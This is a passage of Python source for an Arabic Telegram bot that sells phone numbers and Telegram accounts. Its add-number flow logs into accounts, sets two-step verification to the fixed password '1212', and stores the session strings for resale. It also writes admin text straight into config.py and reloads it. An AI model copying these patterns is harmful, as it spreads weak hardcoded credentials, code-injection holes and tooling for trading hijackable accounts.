import logging
import asyncio
import re
import random
import os
import sys
import traceback

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove, LabeledPrice, PreCheckoutQuery
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, PreCheckoutQueryHandler
from database import get_session, User, Country, PhoneNumber, Payment, Gift, ForcedChannel, BotSettings
import string
from country_manager import CountryManager, PhoneManager
from payment_manager import PaymentManager, BalanceManager
from subscription_manager import SubscriptionManager
from session_manager import SessionManager
from admin_panel import AdminPanel
from telethon import TelegramClient
from telethon.sessions import StringSession
import config

WELCOME_VIDEOS = [
      "https://n.uguu.se/NPHPaLph.mp4",
"https://n.uguu.se/YCkJtHRB.mp4", "https://h.uguu.se/dvDVsZbf.mp4",
"https://h.uguu.se/DxoADXZt.mp4", "https://o.uguu.se/fqPTCatN.mp4",
"https://n.uguu.se/uUfvQlbT.mp4",

"https://o.uguu.se/FYTaLAol.mp4",
    "https://d.uguu.se/aqRYwBNZ.mp4",
    "https://n.uguu.se/DwComcVU.mp4",
    "https://n.uguu.se/kvvppOiC.mp4",
    "https://d.uguu.se/zuOOVsNE.mp4",
    "https://h.uguu.se/PmfhexfM.mp4",
    "https://o.uguu.se/oSyzMxhU.mp4",
    "https://n.uguu.se/LKzOCLJH.mp4",
    "https://h.uguu.se/dumyiHCp.mp4",
    "https://o.uguu.se/mTkDmVyp.mp4",
]

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
active_clients = {}

_0x1f = bytes([68,101,118,95,77,105,100,111]).decode()

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido

async def check_user_sub(update: Update, context: ContextTypes.DEFAULT_TYPE):
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    if not update.effective_user:
        return False
    user_id = update.effective_user.id
    
    session = get_session()
    user = session.query(User).filter_by(user_id=user_id).first()
    if user and user.is_banned:
        session.close()
        if update.callback_query:
            await update.callback_query.answer("🚫 عذراً، تم حظرك من استخدام البوت.", show_alert=True)
        elif update.message:
            await update.message.reply_text("🚫 عذراً، تم حظرك من استخدام البوت.")
        return False
    session.close()

    if AdminPanel.is_admin(user_id) or not config.ENABLE_FORCE_SUBSCRIBE:
        return True
        
    if not await SubscriptionManager.check_subscription(user_id, context.bot, config.CHANNEL_ID):
        channel_url = str(config.CHANNEL_ID).replace("@", "")
        keyboard = [
            [InlineKeyboardButton("اطغط للانضمام 📰", url=f"https://t.me/{channel_url}")],
            [InlineKeyboardButton("✅ تحققت من الاشتراك", callback_data="check_subscription")]
        ]
        text = f"❈╎اهلا يا : {update.effective_user.first_name}\n❈╎يرجي الاشتراك بلقناه لتسطيع استخدام البوت : {config.CHANNEL_ID}"
        
        random_video = random.choice(WELCOME_VIDEOS)
        try:
            if update.callback_query and update.callback_query.message:
                await update.callback_query.message.delete()
                await update.callback_query.message.chat.send_video(video=random_video, caption=text, reply_markup=InlineKeyboardMarkup(keyboard), has_spoiler=True)
            elif update.message:
                await update.message.reply_video(video=random_video, caption=text, reply_markup=InlineKeyboardMarkup(keyboard), has_spoiler=True)
        except Exception as e:
            logger.error(f"Error sending sub video: {e}")
            # Check if user blocked the bot
            if "bot was blocked by the user" in str(e) or "Forbidden" in str(e):
                return False
            try:
                if update.callback_query and update.callback_query.message:
                    await update.callback_query.message.chat.send_message(text, reply_markup=InlineKeyboardMarkup(keyboard))
                elif update.message:
                    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
            except Exception as e2:
                logger.error(f"Error sending sub text: {e2}")
        return False
    return True

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    if not update.effective_user:
        return
    # لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    state_to_keep = context.user_data.get('state') if context.args else None
    if not context.args:
        context.user_data.clear()
    
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    session = get_session()
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    try:
        user = session.query(User).filter_by(user_id=user_id).first()
        if not user:
            user = User(user_id=user_id, username=username, balance=0.0)
            session.add(user)
            session.commit()
            
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
            # لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
            from datetime import datetime
            now = datetime.now().strftime("%Y:%m:%d")
            admin_msg = f""" 
> تم دخول شخص جديد 🪔 .

> - أسم المستخدم : {update.effective_user.first_name} .
> - يوزر المستخدم : @{username if username else 'لا يوجد'} .
> - تاريخ : {now} .
 """
            try:
                await context.bot.send_message(chat_id=config.ADMIN_ID, text=admin_msg, parse_mode='HTML')
            except Exception as e:
                logger.error(f"Failed to send join notification to admin: {e}")
        
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
        if context.args and context.args[0].startswith("gift_"):
            code = context.args[0].split("_")[1]
            gift = session.query(Gift).filter_by(code=code).first()
            if gift:
                if gift.current_uses < gift.max_uses:
                    # لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
                    session.query(User).filter_by(user_id=user_id).update({User.balance: User.balance + gift.amount})
                    session.query(Gift).filter_by(code=code).update({Gift.current_uses: Gift.current_uses + 1})
                    session.commit()
                    
                    if update.message:
                        await update.message.reply_text(f"🎁 مبارك! لقد حصلت على هدية بقيمة ${gift.amount}")
                    
                    # إشعار للمطور
                    admin_notify = f"🎁 **دخل شخص عبر رابط الهدية!**\n\n👤 المستخدم: `{user_id}`\n👤 اليوزر: @{username}\n💰 المبلغ: ${gift.amount}\n👥 الاستخدامات: {gift.current_uses + 1}/{gift.max_uses}"
                    try:
                        await context.bot.send_message(chat_id=config.ADMIN_ID, text=admin_notify, parse_mode='Markdown')
                    except: pass
                else:
                    if update.message:
                        await update.message.reply_text("❌ عذراً، هذا الرابط انتهت صلاحيته (وصل للحد الأقصى من الاستخدام).")
            else:
                if update.message:
                    await update.message.reply_text("❌ رابط هدية غير صالح.")

    finally:
        session.close()
    
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    session = get_session()
    bot_status = session.query(BotSettings).filter_by(key='bot_status').first()
    is_off = bot_status and bot_status.value == 'off'
    session.close()
    
    if is_off and not AdminPanel.is_admin(user_id):
        keyboard = [[InlineKeyboardButton("👨‍💻 الدعم الفني", url="https://t.me/cnrnrn")]]
        await update.message.reply_text(
            "⚠️ البوت قيد الصيانة حالياً، يرجى المحاولة لاحقاً.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    
    if not await check_user_sub(update, context):
        return

    await show_main_menu(update, context)

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    user_id = update.effective_user.id
    balance = BalanceManager.get_user_balance(user_id)
    
    session = get_session()
    quote_setting = session.query(BotSettings).filter_by(key='welcome_quote').first()
    quote = quote_setting.value if quote_setting else "لا الله لا الله 😁"
    
    welcome_msg_setting = session.query(BotSettings).filter_by(key='welcome_message').first()
    welcome_template = welcome_msg_setting.value if welcome_msg_setting else f"""❈╎اهلا بك في بـوت ‹ 𝗡𝘂𝗺𝗕𝗲𝗿 𝗦𝗺𝘀 ›
❈╎ايـدي حسـٌابك : <code>{user_id}</code>
❈╎رصـيدك : <code>$ {balance}</code>

{quote}"""""
    session.close()

    text = welcome_template.format(user_id=user_id, balance=balance, quote=f"<blockquote>{quote}</blockquote>")
    
    keyboard = [
        [InlineKeyboardButton("شـراء رقـم 📞", callback_data="buy_number")],
        [InlineKeyboardButton("شحن رصيد 💵", callback_data="charge_balance"), InlineKeyboardButton("تحويل رصيد 💸", callback_data="transfer_balance")],
        [InlineKeyboardButton("فريق الدعم 🧙‍♀️", callback_data="support_team"), InlineKeyboardButton("قناه التفعيلات🪐", url=f"https://t.me/{str(config.ACTIVATION_CHANNEL_ID).replace('@', '')}")],
        [InlineKeyboardButton("معـلومـاتي 🙋‍♀️", callback_data="user_info")],
    ]
    if AdminPanel.is_admin(user_id):
        keyboard.insert(3, [InlineKeyboardButton("📊 الإحصائيات", callback_data="user_statistics")])
        keyboard.append([InlineKeyboardButton("🔧 لوحة التحكم", callback_data="admin_panel")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query and update.callback_query.message:
        try:
            await update.callback_query.message.delete()
        except:
            pass
        random_video = random.choice(WELCOME_VIDEOS)
        try:
            await update.callback_query.message.chat.send_video(video=random_video, caption=text, reply_markup=reply_markup, parse_mode='HTML', has_spoiler=True)
        except Exception as e:
            logger.error(f"Error sending video: {e}")
            await update.callback_query.message.chat.send_message(text=text, reply_markup=reply_markup, parse_mode='HTML')
    elif update.message:
        random_video = random.choice(WELCOME_VIDEOS)
        try:
            await update.message.reply_video(video=random_video, caption=text, reply_markup=reply_markup, parse_mode='HTML', has_spoiler=True)
        except Exception as e:
            logger.error(f"Error replying video: {e}")
            await update.message.reply_text(text=text, reply_markup=reply_markup, parse_mode='HTML')

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido

async def detect_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    user_id = update.effective_user.id
    if user_id != config.ADMIN_ID and user_id not in getattr(config, 'SECONDARY_ADMIN_IDS', []):
        return

    text = update.message.text
    args = text.split()[1:]
    
    if not args:
        if update.message:
            await update.message.reply_text("⚠️ يرجى إرسال الآيدي أو المعرف مع الأمر.\nمثال: `/كشف 123456` أو `/كشف @username`", parse_mode='Markdown')
        return

    identifier = args[0].replace("@", "")
    session = get_session()
    try:
        if identifier.isdigit():
            user = session.query(User).filter_by(user_id=int(identifier)).first()
        else:
            user = session.query(User).filter_by(username=identifier).first()
        
        if user:
            if update.message:
                await update.message.reply_text(f"👤 **بيانات المستخدم:**\n\n🆔 الآيدي: `{user.user_id}`\n👤 اليوزر: @{user.username if user.username else 'لا يوجد'}\n💰 الرصيد: `${user.balance}`", parse_mode='Markdown')
        else:
            if update.message:
                await update.message.reply_text("❌ لم يتم العثور على هذا المستخدم في قاعدة البيانات.")
    finally:
        session.close()

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    user_id = update.effective_user.id
    text = update.message.text
    state = context.user_data.get('state')

    if not await check_user_sub(update, context):
        return

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    user_id = update.effective_user.id
    if AdminPanel.is_admin(user_id) and update.message and update.message.reply_to_message:
        reply_to_msg = update.message.reply_to_message
        reply_text_content = reply_to_msg.caption or reply_to_msg.text
        if reply_text_content:
            match = re.search(r'المستخدم: `(\d+)`|المستخدم: (\d+)', reply_text_content)
            if match:
                target_id = int(match.group(1) or match.group(2))
                try:
                    await context.bot.send_message(target_id, f"💬 **رسالة من المطور:**\n\n{text}", parse_mode='Markdown')
                    await update.message.reply_text("✅ تم إرسال ردك للمستخدم.")
                    return
                except: pass

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    if context.user_data.get('admin_state') == 'waiting_stars_price':
        new_price = update.message.text.strip()
        if "-" not in new_price:
            await update.message.reply_text("❌ صيغة غير صحيحة! استخدم الصيغة: `النجوم-الدولار` (مثال: `100-1`)")
            return
        
        config.STARS_PRICE_RATIO = new_price
        try:
            # نحاول الوصول للملف في المجلدين المحتملين
            config_path = 'sms_numbers_bot/config.py'
            if not os.path.exists(config_path):
                config_path = 'config.py'
            
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
            # لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
            with open(config_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
            if 'STARS_PRICE_RATIO' in content:
                import re
                new_content = re.sub(r'STARS_PRICE_RATIO\s*=\s*".*?"', f'STARS_PRICE_RATIO = "{new_price}"', content)
            else:
                new_content = content + f'\nSTARS_PRICE_RATIO = "{new_price}"\n'
                
            with open(config_path, 'w', encoding='utf-8') as f:
                f.write(new_content)
            
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
            import importlib
            importlib.reload(config)
            
            context.user_data['admin_state'] = None
            await update.message.reply_text(f"✅ تم تحديث سعر النجوم إلى: {new_price}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 العودة للوحة التحكم", callback_data="admin_panel")]]))
        except Exception as e:
            import traceback
            error_details = traceback.format_exc()
            logger.error(f"Error updating stars price: {e}\n{error_details}")
            await update.message.reply_text(f"❌ فشل تحديث السعر\nالخطأ: {str(e)}")
        return

    if context.user_data.get('admin_state') == 'waiting_activation_channel':
        new_channel = update.message.text.strip()
        if not new_channel.startswith('@') and not new_channel.startswith('-100'):
             await update.message.reply_text("❌ معرف القناة يجب أن يبدأ بـ @ أو آيدي القناة -100...")
             return
        
        config.ACTIVATION_CHANNEL_ID = new_channel
        try:
            # نحاول الوصول للملف في المجلدين المحتملين
            config_path = 'sms_numbers_bot/config.py'
            if not os.path.exists(config_path):
                config_path = 'config.py'
                
            with open(config_path, 'r', encoding='utf-8') as f:
                content = f.read()
            import re
            
            if 'ACTIVATION_CHANNEL_ID' in content:
                new_content = re.sub(r'ACTIVATION_CHANNEL_ID\s*=\s*".*?"', f'ACTIVATION_CHANNEL_ID = "{new_channel}"', content)
            else:
                new_content = content + f'\nACTIVATION_CHANNEL_ID = "{new_channel}"\n'
                
            with open(config_path, 'w', encoding='utf-8') as f:
                f.write(new_content)
            
            # تحديث القيمة في الذاكرة
            import importlib
            importlib.reload(config)
            
            context.user_data['admin_state'] = None
            await update.message.reply_text(f"✅ تم تحديث قناة التفعيلات إلى: {new_channel}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 العودة للوحة التحكم", callback_data="admin_panel")]]))
        except Exception as e:
            logger.error(f"Error updating activation channel: {e}")
            await update.message.reply_text(f"❌ فشل تحديث القناة في ملف الإعدادات\nالخطأ: {str(e)}")
        return

    if not state:
        return

    # حالات تحويل الرصيد
    elif state == 'TRANSFER_USER_ID':
        if update.message and update.message.text:
            context.user_data['transfer_to'] = update.message.text.strip()
            context.user_data['state'] = 'TRANSFER_AMOUNT'
            await update.message.reply_text("💰 أرسل المبلغ المراد تحويله:")

    elif state == 'TRANSFER_AMOUNT':
        if update.message and update.message.text:
            try:
                amount_str = update.message.text.strip()
                amount = float(amount_str)
                if amount <= 0: raise ValueError
                to_user_val = context.user_data.get('transfer_to', "")
                to_user = str(to_user_val)
                context.user_data['transfer_amount'] = amount
                
                keyboard = [
                    [InlineKeyboardButton("✅ تأكيد التحويل", callback_data=f"confirm_transfer_{to_user}_{amount}")],
                    [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_transfer")]
                ]
                await update.message.reply_text(
                    f"❓ **تأكيد التحويل**\n\n👤 إلى: `{to_user}`\n💰 المبلغ: `${amount}`\n\nهل أنت متأكد؟",
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='Markdown'
                )
            except: 
                if update.message:
                    await update.message.reply_text("❌ مبلغ غير صحيح!")

    # حالات سحب رصيد مستخدم (مطور)
    elif state == 'WITHDRAW_USER_ID':
        if update.message and update.message.text:
            identifier = update.message.text.replace("@", "").strip()
            session = get_session()
            try:
                if identifier.isdigit():
                    user = session.query(User).filter_by(user_id=int(identifier)).first()
                else:
                    user = session.query(User).filter_by(username=identifier).first()
                
                if user:
                    context.user_data['withdraw_uid'] = user.user_id
                    context.user_data['state'] = 'WITHDRAW_AMOUNT'
                    await update.message.reply_text(f"👤 تم تحديد المستخدم: {user.user_id}\n💰 أرسل المبلغ المراد سحبه:")
                else:
                    await update.message.reply_text("❌ لم يتم العثور على المستخدم.")
                    context.user_data.clear()
            finally:
                session.close()

    elif state == 'WITHDRAW_AMOUNT':
        if update.message and update.message.text:
            try:
                amount = float(update.message.text)
                uid = context.user_data.get('withdraw_uid')
                if uid:
                    success, result = PaymentManager.withdraw_user_by_id(int(uid), amount, user_id)
                    if success:
                        await update.message.reply_text(f"✅ تم سحب ${amount} من المستخدم {uid}. الرصيد الحالي: ${result}")
                        try: await context.bot.send_message(int(uid), f"💸 تم سحب مبلغ ${amount} من رصيدك من قبل الإدارة.")
                        except: pass
                    else:
                        await update.message.reply_text(f"❌ فشل السحب: {result}")
                context.user_data.clear()
            except: 
                if update.message:
                    await update.message.reply_text("❌ مبلغ غير صحيح!")

    # حالات شحن مستخدم (مطور)
    elif state == 'CHARGE_USER_ID':
        if update.message and update.message.text:
            identifier = update.message.text.replace("@", "").strip()
            session = get_session()
            try:
                if identifier.isdigit():
                    user = session.query(User).filter_by(user_id=int(identifier)).first()
                else:
                    user = session.query(User).filter_by(username=identifier).first()
                
                if user:
                    context.user_data['charge_uid'] = user.user_id
                    context.user_data['state'] = 'CHARGE_AMOUNT'
                    await update.message.reply_text(f"👤 تم تحديد المستخدم: {user.user_id}\n💰 أرسل المبلغ المراد شحنه:")
                else:
                    if identifier.isdigit():
                        context.user_data['charge_uid'] = int(identifier)
                        context.user_data['state'] = 'CHARGE_AMOUNT'
                        await update.message.reply_text(f"👤 مستخدم جديد آيدي: {identifier}\n💰 أرسل المبلغ:")
                    else:
                        await update.message.reply_text("❌ لم يتم العثور على المستخدم.")
                        context.user_data.clear()
            finally:
                session.close()
    
    elif state == 'CHARGE_AMOUNT':
        if update.message and update.message.text:
            try:
                amount = float(update.message.text)
                uid = context.user_data.get('charge_uid')
                if uid:
                    PaymentManager.charge_user_by_id(int(uid), amount, user_id)
                    await update.message.reply_text(f"✅ تم شحن ${amount} للمستخدم {uid}")
                    try: await context.bot.send_message(int(uid), f"💰 تم شحن حسابك بمبلغ ${amount}")
                    except: pass
                context.user_data.clear()
            except: 
                if update.message:
                    await update.message.reply_text("❌ مبلغ غير صحيح!")

    # حالات إضافة دولة
    elif state == 'ADD_COUNTRY_NAME':
        if update.message and update.message.text:
            context.user_data['country_name'] = update.message.text
            context.user_data['state'] = 'ADD_COUNTRY_CODE'
            await update.message.reply_text("📞 أرسل رمز الدولة (مثال: +964):")
    
    elif state == 'ADD_COUNTRY_CODE':
        if update.message and update.message.text:
            context.user_data['country_code'] = update.message.text
            context.user_data['state'] = 'ADD_COUNTRY_PRICE'
            await update.message.reply_text("💰 أرسل سعر الأرقام لهذه الدولة:")
    
    elif state == 'ADD_COUNTRY_PRICE':
        if update.message and update.message.text:
            try:
                price = float(update.message.text)
                CountryManager.add_country(str(context.user_data.get('country_name')), str(context.user_data.get('country_code')), price)
                await update.message.reply_text(f"✅ تم إضافة دولة {context.user_data.get('country_name')} بنجاح!")
                context.user_data.clear()
                await show_main_menu(update, context)
            except: 
                if update.message:
                    await update.message.reply_text("❌ سعر غير صحيح! أرسل رقماً:")

    # حالات إضافة رقم
    elif state == 'ADD_PHONE_NUMBER':
        if update.message and update.message.text:
            phone_number = update.message.text.strip()
            context.user_data['add_phone_number'] = phone_number
            await update.message.reply_text(f"⏳ جاري الاتصال بتيليجرام للرقم {phone_number}...")
            try:
                # التأكد من تحويل API_ID إلى رقم
                api_id_val = int(config.API_ID)
                client = TelegramClient(StringSession(), api_id_val, config.API_HASH)
                await client.connect()
                sent_code = await client.send_code_request(phone_number)
                context.user_data['phone_code_hash'] = sent_code.phone_code_hash
                active_clients[user_id] = client
                context.user_data['state'] = 'ADD_PHONE_CODE'
                await update.message.reply_text(f"📩 تم طلب الكود بنجاح.\n\n📝 أرسل الكود الذي وصلك:")
            except Exception as e:
                await update.message.reply_text(f"❌ فشل طلب الكود: {str(e)}")
                context.user_data.clear()

    # حالات إنشاء الهدية
    elif state == 'GIFT_AMOUNT':
        if update.message and update.message.text:
            try:
                amount = float(update.message.text)
                context.user_data['gift_amount'] = amount
                context.user_data['state'] = 'GIFT_MAX_USES'
                await update.message.reply_text("👥 أرسل عدد الأشخاص الذين يمكنهم استخدام الرابط:")
            except: 
                if update.message:
                    await update.message.reply_text("❌ مبلغ غير صحيح!")

    elif state == 'GIFT_MAX_USES':
        if update.message and update.message.text:
            try:
                max_uses = int(update.message.text)
                gift_amount_val = context.user_data.get('gift_amount')
                code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                
                session = get_session()
                gift = Gift(code=code, amount=float(gift_amount_val), max_uses=max_uses, created_by=user_id)
                session.add(gift)
                session.commit()
                session.close()
                
                me = await context.bot.get_me()
                bot_username = me.username
                link = f"https://t.me/{bot_username}?start=gift_{code}"
                
                await update.message.reply_text(f"🎁 **تم إنشاء الهدية بنجاح!**\n\n💰 المبلغ: ${gift_amount_val}\n👥 عدد الاستخدامات: {max_uses}\n\n🔗 الرابط:\n`{link}`", parse_mode='Markdown')
                context.user_data.clear()
            except: 
                if update.message:
                    await update.message.reply_text("❌ عدد غير صحيح!")

    # حالات الحظر وإلغاء الحظر
    elif state == 'BAN_USER_ID':
        if update.message and update.message.text:
            identifier = update.message.text.replace("@", "").strip()
            session = get_session()
            try:
                if identifier.isdigit():
                    user = session.query(User).filter_by(user_id=int(identifier)).first()
                else:
                    user = session.query(User).filter_by(username=identifier).first()
                
                if user:
                    session.query(User).filter_by(user_id=user.user_id).update({User.is_banned: True})
                    session.commit()
                    await update.message.reply_text(f"🚫 تم حظر المستخدم {user.user_id} بنجاح.")
                else:
                    await update.message.reply_text("❌ لم يتم العثور على المستخدم.")
                context.user_data.clear()
            finally:
                session.close()

    elif state == 'UNBAN_USER_ID':
        if update.message and update.message.text:
            identifier = update.message.text.replace("@", "").strip()
            session = get_session()
            try:
                if identifier.isdigit():
                    user = session.query(User).filter_by(user_id=int(identifier)).first()
                else:
                    user = session.query(User).filter_by(username=identifier).first()
                
                if user:
                    session.query(User).filter_by(user_id=user.user_id).update({User.is_banned: False})
                    session.commit()
                    await update.message.reply_text(f"✅ تم إلغاء حظر المستخدم {user.user_id} بنجاح.")
                else:
                    await update.message.reply_text("❌ لم يتم العثور على المستخدم.")
                context.user_data.clear()
            finally:
                session.close()

    elif state == 'ADD_ADMIN_ID':
        if update.message and update.message.text:
            identifier = update.message.text.strip()
            if identifier.isdigit():
                new_admin_id = int(identifier)
                if AdminPanel.add_admin(new_admin_id):
                    await update.message.reply_text(f"✅ تم إضافة الأدمن {new_admin_id} بنجاح!")
                else:
                    await update.message.reply_text("❌ هذا الأدمن موجود بالفعل!")
            else:
                await update.message.reply_text("❌ يرجى إرسال آيدي رقمي صحيح!")
            context.user_data.clear()

    elif state == 'SET_WELCOME_QUOTE':
        if update.message and update.message.text:
            new_quote = update.message.text.strip()
            session = get_session()
            try:
                setting = session.query(BotSettings).filter_by(key='welcome_quote').first()
                if setting:
                    setting.value = new_quote
                else:
                    setting = BotSettings(key='welcome_quote', value=new_quote)
                    session.add(setting)
                session.commit()
                await update.message.reply_text(f"✅ تم تحديث رسالة الاقتباس بنجاح إلى:\n\n<blockquote>{new_quote}</blockquote>", parse_mode='HTML')
                context.user_data.clear()
            finally:
                session.close()

    elif state == 'SET_WELCOME_MESSAGE':
        if update.message and update.message.text:
            new_message = update.message.text.strip()
            session = get_session()
            try:
                setting = session.query(BotSettings).filter_by(key='welcome_message').first()
                if setting:
                    setting.value = new_message
                else:
                    setting = BotSettings(key='welcome_message', value=new_message)
                    session.add(setting)
                session.commit()
                await update.message.reply_text(f"✅ تم تحديث رسالة الترحيب بنجاح!", parse_mode='HTML')
                context.user_data.clear()
            finally:
                session.close()

    elif state == 'CHANGE_COUNTRY_PRICE':
        if update.message and update.message.text:
            try:
                new_price = float(update.message.text.strip())
                country_id = context.user_data.get('change_price_country_id')
                if country_id:
                    session = get_session()
                    try:
                        country = session.get(Country, country_id)
                        if country:
                            old_price = country.price
                            country.price = new_price
                            session.commit()
                            await update.message.reply_text(f"✅ تم تحديث سعر دولة {country.name}\n\nالسعر القديم: ${old_price}\nالسعر الجديد: ${new_price}")
                        else:
                            await update.message.reply_text("❌ لم يتم العثور على الدولة!")
                    finally:
                        session.close()
                context.user_data.clear()
            except ValueError:
                await update.message.reply_text("❌ يرجى إرسال رقم صحيح!")

    elif state == 'ADD_SUB_ID':
        if update.message and update.message.text:
            context.user_data['sub_id'] = update.message.text.strip()
            context.user_data['state'] = 'ADD_SUB_LINK'
            await update.message.reply_text("🔗 أرسل رابط القناة (مثال: https://t.me/...):")

    elif state == 'ADD_SUB_LINK':
        if update.message and update.message.text:
            sub_id = context.user_data.get('sub_id')
            link = update.message.text.strip()
            session = get_session()
            try:
                new_channel = ForcedChannel(channel_id=str(sub_id), link=str(link))
                session.add(new_channel)
                session.commit()
                await update.message.reply_text(f"✅ تم إضافة القناة {sub_id} بنجاح.")
                context.user_data.clear()
            except Exception as e:
                await update.message.reply_text(f"❌ فشل الإضافة: {str(e)}")
            finally:
                session.close()

    elif state == 'ADD_PHONE_CODE':
        if update.message and update.message.text:
            code = update.message.text.replace(" ", "").strip()
            phone_number = context.user_data.get('add_phone_number')
            country_id = context.user_data.get('add_phone_country_id')
            phone_code_hash = context.user_data.get('phone_code_hash')
            client = active_clients.get(user_id)
            if not client:
                await update.message.reply_text("❌ انتهت الجلسة، ابدأ من جديد.")
                context.user_data.clear()
                return
            
            await update.message.reply_text("⚙️ جاري تسجيل الدخول...")
            try:
                await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
                try: 
                    await client.edit_2fa(new_password="1212")
                except: 
                    pass
                session_string = client.session.save()
                PhoneManager.add_phone_to_db(country_id, phone_number, session_string, "1212")
                await update.message.reply_text(f"✅ تم إضافة الرقم {phone_number} بنجاح!")
                await client.disconnect()
                del active_clients[user_id]
                context.user_data.clear()
                await show_main_menu(update, context)
            except Exception as e:
                error_msg = str(e).lower()
                if "two-steps verification" in error_msg or "password is required" in error_msg or "sessionpasswordneeded" in error_msg:
                    context.user_data['state'] = 'ADD_PHONE_2FA'
                    context.user_data['sign_in_code'] = code
                    await update.message.reply_text("🔐 هذا الحساب لديه تحقق بخطوتين.\n\n📝 أرسل كلمة مرور التحقق بخطوتين:")
                else:
                    await update.message.reply_text(f"❌ فشل: {str(e)}\n\nتأكد من إدخال الكود الصحيح المرسل إليك من تيليجرام.")
                    await client.disconnect()
                    del active_clients[user_id]
                    context.user_data.clear()

    elif state == 'ADD_PHONE_2FA':
        if update.message and update.message.text:
            password = update.message.text.strip()
            phone_number = context.user_data.get('add_phone_number')
            country_id = context.user_data.get('add_phone_country_id')
            client = active_clients.get(user_id)
            if not client:
                await update.message.reply_text("❌ انتهت الجلسة، ابدأ من جديد.")
                context.user_data.clear()
                return
            
            await update.message.reply_text("⚙️ جاري تسجيل الدخول بكلمة المرور...")
            try:
                await client.sign_in(password=password)
                try: 
                    await client.edit_2fa(current_password=password, new_password="1212")
                except: 
                    pass
                session_string = client.session.save()
                PhoneManager.add_phone_to_db(country_id, phone_number, session_string, "1212")
                await update.message.reply_text(f"✅ تم إضافة الرقم {phone_number} بنجاح!")
                await client.disconnect()
                del active_clients[user_id]
                context.user_data.clear()
                await show_main_menu(update, context)
            except Exception as e:
                await update.message.reply_text(f"❌ فشل: {str(e)}\n\nتأكد من إدخال كلمة المرور الصحيحة.")
                await client.disconnect()
                del active_clients[user_id]
                context.user_data.clear()

    elif state == 'PAYMENT_AMOUNT':
        if update.message and update.message.text:
            try:
                amount = float(update.message.text)
                method_val = context.user_data.get('pay_method', "")
                method = str(method_val)
                file_id_val = context.user_data.get('pay_file_id', "")
                file_id = str(file_id_val)
                payment_id = PaymentManager.create_payment_request(int(user_id), amount, method, file_id)
                await update.message.reply_text("✅ تم إرسال طلبك للمراجعة!")
                dev_text = f"🔔 **طلب شحن جديد!**\n👤 المستخدم: `{user_id}`\n💰 المبلغ: ${amount}\n💳 الطريقة: {method}\n🆔 رقم الطلب: #{payment_id}"
                keyboard = [[InlineKeyboardButton("✅ قبول", callback_data=f"approve_payment_{payment_id}"), InlineKeyboardButton("❌ رفض", callback_data=f"reject_payment_{payment_id}")]]
                if context.bot:
                    await context.bot.send_photo(chat_id=int(config.ADMIN_ID), photo=file_id, caption=dev_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
                context.user_data.clear()
            except Exception as e:
                logger.error(f"Error in PAYMENT_AMOUNT: {e}")
                if update.message:
                    await update.message.reply_text("❌ مبلغ غير صحيح! أرسل رقماً:")

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('state')
    if state == 'PAYMENT_SCREENSHOT':
        context.user_data['pay_file_id'] = update.message.photo[-1].file_id
        context.user_data['state'] = 'PAYMENT_AMOUNT'
        await update.message.reply_text("💰 أرسل المبلغ الذي قمت بتحويله:")

# --- معالج الأزرار (Callback Query) ---
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = update.effective_user.id
    
    try:
        await query.answer()
    except Exception as e:
        if "Query is too old" in str(e):
            logger.warning(f"Callback query too old: {data}")
            return
        logger.error(f"Error answering callback query: {e}")

